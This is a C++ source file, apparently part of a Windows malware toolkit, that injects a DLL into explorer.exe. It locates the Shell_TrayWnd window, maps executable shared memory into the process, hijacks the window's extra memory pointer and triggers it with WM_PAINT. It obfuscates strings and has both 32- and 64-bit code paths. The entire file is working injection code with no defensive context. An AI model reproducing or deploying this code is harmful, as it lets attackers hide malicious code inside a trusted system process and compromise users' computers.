#include "sys_includes.h"
#include <stddef.h>

#include "syslib\system.h"
#include "syslib\inject.h"
#include "syslib\mem.h"
#include "syslib\utils.h"
#include "syslib\ldr.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

#include "explorer_inj.h"

#ifdef _X86_
#include "syslib\wow64.h"
static bool SetProcess64_InternalShit(HWND hWnd,HANDLE hProc,DWORD64 dwDllEntryPoint,byte *lpParam,DWORD dwParamSize)
{
    bool bRet=false;

    DWORD dwSize=sizeof(INJ_STRUCT)+dwParamSize;
    INJ_STRUCT *lpInj=NULL;
    DWORD64 dwParam=0;
    do
    {
        HANDLE hSection=SysCreateSharedSection64(hProc,dwSize,PAGE_READWRITE,(void**)&lpInj,&dwParam);
        if (!hSection)
            break;

        if (dwParamSize)
        {
            lpInj->dwParamSize=dwParamSize;
            memcpy(lpInj->bParam,lpParam,dwParamSize);
        }

        lpInj->iiInternal.uPreAddr.dwAddr64=dwParam+offsetof(INJ_STRUCT,iiInternal.dwAddr64_1);
        lpInj->iiInternal.uHwnd.hWnd=hWnd;
        lpInj->iiInternal.dwAddr64_1=dwDllEntryPoint;

        HANDLE hEvent=CreateEvent(NULL,true,false,NULL);
        DuplicateHandle(GetCurrentProcess(),hEvent,hProc,&lpInj->iiInternal.Event.hEvent,0,false,DUPLICATE_SAME_ACCESS);

        lpInj->iiInternal.dwOldParam.dwParam64=SetWindowLongPtr64(hWnd,0,dwParam);
        SendMessage(hWnd,WM_PAINT,0,0);
        bRet=(WaitForSingleObject(hEvent,60000) == WAIT_OBJECT_0);
        SysCloseHandle(hEvent);
    }
    while (false);
    return bRet;
}

SYSLIBFUNC(BOOL) InjectOurShitToExplorer64Param(LPBYTE lpDll64,LPBYTE lpParam,DWORD dwParamSize)
{
    BOOL bRet=false;
    DWORD dwPID;
    HWND hWnd=FindWindowA(dcrA_acce3ca3("Shell_TrayWnd"),NULL);
    GetWindowThreadProcessId(hWnd,&dwPID);

    HANDLE hProc=SysOpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_DUP_HANDLE,dwPID);
    if (hProc)
    {
        if (SysIsProcess64(hProc))
        {
            DWORD64 dwBaseAddr,dwDllEntryPoint=PreparePlaceForOurDll64(hProc,lpDll64,&dwBaseAddr);
            if (dwDllEntryPoint)
            {
                if (!SetProcess64_InternalShit(hWnd,hProc,dwDllEntryPoint,lpParam,dwParamSize))
                    NtUnmapViewOfSection64(hProc,dwBaseAddr);
                else
                    bRet=true;
            }
        }
        SysCloseHandle(hProc);
    }
    return bRet;
}
#endif

static bool SetProcess_InternalShit(HWND hWnd,HANDLE hProc,void *lpDllEntryPoint,byte *lpParam,DWORD dwParamSize)
{
    bool bRet=false;

    DWORD dwSize=sizeof(INJ_STRUCT)+dwParamSize;
    INJ_STRUCT *lpInj=NULL;
    byte *lpMem=0;
    do
    {
        HANDLE hSection=SysCreateSharedSection(hProc,dwSize,PAGE_EXECUTE_READWRITE,(void**)&lpInj,(void**)&lpMem);
        if (!hSection)
            break;

        if (dwParamSize)
        {
            lpInj->dwParamSize=dwParamSize;
            memcpy(lpInj->bParam,lpParam,dwParamSize);
        }

        lpInj->iiInternal.uHwnd.hWnd=hWnd;

#ifdef _X86_
        lpInj->iiInternal.uPreAddr.dwAddr32=(DWORD32)lpMem+offsetof(INJ_STRUCT,iiInternal.dwAddr32_1);
        lpInj->iiInternal.dwAddr32_1=(DWORD32)lpDllEntryPoint;
#else
        lpInj->iiInternal.uPreAddr.dwAddr64=(DWORD64)lpMem+offsetof(INJ_STRUCT,iiInternal.dwAddr64_1);
        lpInj->iiInternal.dwAddr64_1=(DWORD64)lpDllEntryPoint;
#endif

        HANDLE hEvent=CreateEvent(NULL,true,false,NULL);
        DuplicateHandle(GetCurrentProcess(),hEvent,hProc,&lpInj->iiInternal.Event.hEvent,0,false,DUPLICATE_SAME_ACCESS);

        lpInj->iiInternal.dwOldParam.dwParam=SetWindowLongPtr(hWnd,0,(ULONG_PTR)lpMem);
        SendMessage(hWnd,WM_PAINT,0,0);
        bRet=(WaitForSingleObject(hEvent,60000) == WAIT_OBJECT_0);
        SysCloseHandle(hEvent);
    }
    while (false);
    return bRet;
}

SYSLIBFUNC(BOOL) InjectOurShitToExplorerParam(LPBYTE lpDll,LPBYTE lpParam,DWORD dwParamSize)
{
    BOOL bRet=false;
    DWORD dwPID;
    HWND hWnd=FindWindowA(dcrA_acce3ca3("Shell_TrayWnd"),NULL);
    GetWindowThreadProcessId(hWnd,&dwPID);

    HANDLE hProc=SysOpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_DUP_HANDLE,dwPID);
    if (hProc)
    {
        void *lpBaseAddr,*lpDllEntryPoint=PreparePlaceForOurDll(hProc,lpDll,&lpBaseAddr);
        if (lpDllEntryPoint)
        {
            if (!SetProcess_InternalShit(hWnd,hProc,lpDllEntryPoint,lpParam,dwParamSize))
                ZwUnmapViewOfSection(hProc,lpBaseAddr);
            else
                bRet=true;
        }
        SysCloseHandle(hProc);
    }
    return bRet;
}

static void WINAPI tmp2(void *,void *,void *,void *)
{
    return;
}

static void WINAPI tmp1(void *lpInj)
{
    //ZwUnmapViewOfSection(GetCurrentProcess(),lpInj);
    return;
}

SYSLIBFUNC(void) ExplorerInj_Init(LPVOID lpInternalStruct,LPVOID *lppParameter,LPDWORD lpdwSize)
{
    INJ_STRUCT *lpInj=(INJ_STRUCT *)lpInternalStruct;

#ifdef _X86_
    lpInj->iiInternal.dwAddr32_2=(DWORD32)tmp1;
    lpInj->iiInternal.dwAddr32_3=(DWORD32)tmp2;
#else
    lpInj->iiInternal.dwAddr64_2=(DWORD64)tmp1;
    lpInj->iiInternal.dwAddr64_3=(DWORD64)tmp2;
#endif

    SetEvent(lpInj->iiInternal.Event.hEvent);
    SysCloseHandle(lpInj->iiInternal.Event.hEvent);

    SetWindowLongPtr(lpInj->iiInternal.uHwnd.hWnd,0,lpInj->iiInternal.dwOldParam.dwParam);

    if (SYSLIB_SAFE::CheckParamWrite(lppParameter,sizeof(*lppParameter)))
    {
        void *lpParam=NULL;
        if (lpInj->dwParamSize)
        {
            lpParam=VirtualAlloc(NULL,lpInj->dwParamSize,MEM_COMMIT,PAGE_READWRITE);
            if (lpParam)
            {
                memcpy(lpParam,lpInj->bParam,lpInj->dwParamSize);
                *lppParameter=lpParam;

                if (SYSLIB_SAFE::CheckParamWrite(lpdwSize,sizeof(*lpdwSize)))
                    *lpdwSize=lpInj->dwParamSize;
            }
        }
    }
    return;
}

